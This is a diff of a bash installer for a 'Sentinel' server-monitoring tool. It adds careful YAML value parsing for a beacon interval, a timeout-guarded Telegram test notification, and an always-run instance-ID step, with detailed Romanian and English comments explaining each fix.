+    # `set -e` oprește instalarea pe o atribuire cu substituție de comandă care
+    # eșuează. O configurație pe care n-o putem citi trebuie să ducă la fereastra
+    # implicită, nu la o instalare moartă în funcția care calculează un timeout.
+    raw="$(awk '
+        /^[^[:space:]#]/ { inb = ($0 ~ /^beacon:/) }
+        inb && $1 == "interval_s:" { print $2; exit }
+    ' "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 2>/dev/null || true)"
+
+    if [[ -z "$raw" ]]; then
+        # Cheia lipsește, secțiunea lipsește, sau fișierul lipsește. Valoarea
+        # implicită E răspunsul aici — la fel ca în `BeaconConfig` — deci nu se
+        # avertizează. Un avertisment la fiecare instalare care nu setează câmpul
+        # e chiar felul în care operatorul învață să treacă peste avertismente.
+        printf '%s' "$default"
+        return 0
+    fi
+
+    # Ghilimelele NU se scot, dinadins. `_coerce` din sentinel/config.py nu
+    # convertește un `str` la `int`, deci `interval_s: "90"` ajunge la
+    # `asyncio.sleep('90')` și omoară beaconul la prima rundă. Un instalator care
+    # ar citi 90 de acolo ar raporta o fereastră pentru un serviciu care nu
+    # pornește; refuzul de mai jos descrie situația, tolerarea ar ascunde-o.
+    value="$raw"
+
+    if [[ "$value" =~ ^[1-9][0-9]*$ ]]; then
+        : # zecimal, forma obișnuită
+    elif [[ "$value" =~ ^0[0-7]+$ ]]; then
+        # YAML 1.1 citește un zero în față ca OCTAL, iar PyYAML face exact asta:
+        # `060` ajunge 48 în `cfg.beacon.interval_s`, deci beaconul doarme 48 de
+        # secunde. Fereastra de aici trebuie să fie a lui 48, nu a lui 60 —
+        # altfel instalatorul și agentul citesc din nou numere diferite din
+        # același rând, care e chiar lucrul reparat aici.
+        value="$(( 8#${value#0} ))"
+    elif [[ "$value" =~ ^([1-9][0-9]*)\.0+$ ]]; then
+        # Exact ce face `_coerce`: un float întreg devine întregul lui.
+        value="${BASH_REMATCH[1]}"
+    else
+        value=""
+    fi
+
+    if [[ -z "$value" || "$value" -le 0 ]]; then
+        # `08` e cazul care a cerut ramura asta. Nu e nici zecimal (zero în
+        # față), nici octal (cifra 8), deci PyYAML îl lasă ȘIR — agentul e
+        # oricum stricat cu el, doar altfel. Ce nu e acceptabil e felul în care
+        # se afla: `08` trecea de o verificare „numai cifre", ajungea în
+        # `$(( 2 * 08 ))`, iar sub `set -euo pipefail` instalarea murea cu
+        # „value too great for base (error token is "08")" și apoi cu
+        # „limit: unbound variable". Operatorul primea un mesaj despre bash în
+        # locul numelui câmpului, după o schimbare întreagă făcută ca să
+        # primească numele câmpului.
+        warn "beacon.interval_s din ${SENTINEL_CONFIG_DIR}/sentinel.yaml nu e un" \
+             "număr întreg pozitiv de secunde (am citit: ${raw})."
+        warn "Folosesc ${default}s pentru fereastra probei de fum, dar verifică rândul" \
+             "acela: agentul nu obține nici el un număr din el, deci beaconul poate" \
+             "să nu pornească deloc."
+        value="$default"
+    fi
+    printf '%s' "$value"
+}
+
+beacon_seq() {
+    sudo -u postgres psql -d sentinel -tAc \
+        "SELECT cursor FROM collector_cursors WHERE name = 'beacon:seq'" 2>/dev/null \
+        | tr -d '[:space:]'
+}
+
 step_smoke_test() {
     "${SENTINEL_PREFIX}/bin/sentinel" config-check -v || warn "config-check reported problems"
+
+    smoke_beacon_is_beating
 
     # Loopback first: proves the app and nginx agree, independently of DNS, the
     # certificate and the provider firewall. Separating the two checks means a
@@ -1805,14 +2387,83 @@ Rolled back. Compare ${STATE_MARKERS}/baseline-services.txt with the current sta
 }
 
 # --- 39 -------------------------------------------------------------------
+# How long the test send may take before the installer stops waiting for it.
+#
+# The command bounds itself already: one request per allowed chat, ten seconds
+# each. This is the outer bound, and it exists for the case the inner one does
+# not cover — a command that does something other than what this step believes
+# it does. That is not hypothetical: this step used to invoke a flag NOTHING
+# defined, the CLI dropped unknown flags, and the line therefore started a
+# second Telegram long-poller against the token the live unit was already
+# using. It never returned, so neither branch below ever printed, and every
+# deploy was killed by hand at step 39 — which skipped deploy.sh's cleanup of
+# /tmp/sentinel-deploy-*, and that is how three copies of credentiale.txt sat
+# world-readable on the host for nine days (docs/INTARIRE.md §0).
+NOTIFY_TIMEOUT_S=60
+
 step_notify() {
     # Receiving this message IS the end-to-end proof: config loaded, secrets
     # readable, network egress works, the bot token is valid, the chat id is
     # right. A green install log proves much less.
-    "${SENTINEL_PREFIX}/bin/sentinel" telegram --send-test \
-        --message "Sentinel $(cat "${SENTINEL_PREFIX}/VERSION") instalat pe $(hostname -f). Dashboard: https://${DOMAIN:-<fara domeniu>}" \
-        2>/dev/null && ok "Telegram test message sent" \
-        || info "Telegram test not available in this build (arrives in P4)"
+    #
+    # So the verdict here is Telegram's answer, not this script's exit code:
+    # `sentinel telegram --send-test` returns 0 only when the API handed back a
+    # message_id for every allowed chat, 78 when telegram is not configured at
+    # all, and non-zero with the reason printed when a send was tried and did
+    # not land.
+    #
+    # Every substitution has a fallback, and that is not defensive habit: this
+    # runs under `set -e`, where a bare `msg="$(hostname -f)"` aborts the
+    # function the moment `hostname -f` fails — and it does fail, on exactly the
+    # fresh VPS this installer targets, when no FQDN resolves yet. The step
+    # would then print no verdict at all, which is the failure being repaired.
+    local rc=0 msg version host
+    version="$(cat "${SENTINEL_PREFIX}/VERSION" 2>/dev/null || echo unknown)"
+    host="$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown)"
+    msg="Sentinel ${version} instalat pe ${host}. Dashboard: https://${DOMAIN:-<fara domeniu>}"
+
+    if ! have timeout; then
+        # Refused rather than run unguarded. An installer that can hang forever
+        # on its last step is the defect this step is being repaired for, and
+        # "probably fine" is not a reason to reintroduce it.
+        warn "coreutils' timeout(1) is missing, so this step cannot be bounded. \
+Skipping the test send — the alert channel is UNPROVEN. Run it by hand: \
+${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
+        return 0
+    fi
+
+    # stderr is deliberately NOT discarded: when a send fails, Telegram's own
+    # words ("chat not found", "Unauthorized") are the entire diagnostic, and
+    # the previous version of this line sent them to /dev/null.
+    timeout --kill-after=10s "${NOTIFY_TIMEOUT_S}s" \
+        "${SENTINEL_PREFIX}/bin/sentinel" telegram --send-test --message "$msg" || rc=$?
+
+    case "$rc" in
+        0)
+            ok "Telegram accepted the test message for every allowed chat — \
+check that it arrived on your phone"
+            ;;
+        78)
+            info "Telegram is not configured, so nothing was sent. Everything \
+else is installed; alerts will go to the dashboard only."
+            ;;
+        124|137)
+            # 124 = timeout sent TERM, 137 = it had to follow up with KILL.
+            #
+            # A warning, not a die. The host is fully installed by this point,
+            # and stopping the run here would report the wrong thing to the
+            # operator AND to scripts/deploy.sh, which reads a failed install as
+            # "nothing works" and leaves its /tmp tree in place. What is true is
+            # narrower and is said as such: the alert channel is unproven.
+            warn "the Telegram test did not return within ${NOTIFY_TIMEOUT_S}s and was \
+killed. Sentinel is installed; the alert channel is UNPROVEN. Check it by hand: \
+${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
+            ;;
+        *)
+            warn "the Telegram test failed (exit ${rc}) — the reason is printed \
+above, from Telegram. Sentinel is installed, but it cannot reach you yet."
+            ;;
+    esac
 }
 
 # ===========================================================================
@@ -1843,6 +2494,33 @@ main() {
     run_step 25 claude_workspace  step_claude_workspace
     run_step 26 configs           step_configs
     run_step 27 secrets           step_secrets
+
+    # Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config`.
+    #
+    # A stat până acum ÎN pasul 27, iar asta a fost o greșeală cu consecință
+    # măsurată pe gazda de producție: pasul 27 e marcat ca făcut din ziua
+    # instalării și NU e în ALWAYS_STEPS, deci pe orice gazdă instalată înainte
+    # ca identitatea să existe, apelul nu se atingea niciodată. Comanda de
+    # actualizare din docs/DEPLOYMENT.md §7 nu trece `--force-step 27` și nimic
+    # nu o obliga; în schimb `step_start_services` (ALWAYS) repornea beaconul
+    # oricum. Rezultat: cod nou, fișier inexistent, beacon repornit direct în
+    # tăcere, iar martorul suna o alarmă critică despre un server sănătos.
+    # Documentația nu putea repara asta — o gazdă nu citește documentație.
+    #
+    # De ce nu un pas nou: un număr nou ar muta numerele tuturor pașilor de după
+    # el, adică ar invalida fiecare `--force-step N` din documentație, din
+    # DEPANARE.md și din istoricul comenzilor operatorului.
+    #
+    # De ce nu `secrets` în ALWAYS_STEPS: pasul ăla citește stdin și rescrie
+    # /etc/sentinel/secrets.env de la zero. Rularea lui la fiecare deploy e
+    # exact operația pentru care există toată mașinăria de păstrare a cheilor,
+    # și n-are nicio legătură cu identitatea.
+    #
+    # Sigur de rulat oricând: `ensure_instance_id` e idempotentă și refuză
+    # explicit să regenereze o identitate existentă — vezi corpul ei. Asta e
+    # chiar proprietatea pentru care a fost scrisă așa.
+    ensure_instance_id
+
     run_step 28 migrate           step_migrate
     run_step 29 nftables          step_nftables
     run_step 30 systemd           step_systemd
@@ -1855,10 +2533,11 @@ main() {
     fi
     run_step 34 admin_user        step_admin_user
     run_step 35 suricata          step_suricata
-    run_step 36 auxiliary         step_auxiliary
-    run_step 37 smoke_test        step_smoke_test
-    run_step 38 verify_intact     step_verify_nothing_broken
-    run_step 39 notify            step_notify
+    run_step 36 deploy_account    step_deploy_account
+    run_step 37 auxiliary         step_auxiliary
+    run_step 38 smoke_test        step_smoke_test
+    run_step 39 verify_intact     step_verify_nothing_broken
+    run_step 40 notify            step_notify
 
     # Before the success banner, not after it: what the run declined to do, and
     # whether what it was told to force actually ran. `assert_forced_steps_ran`
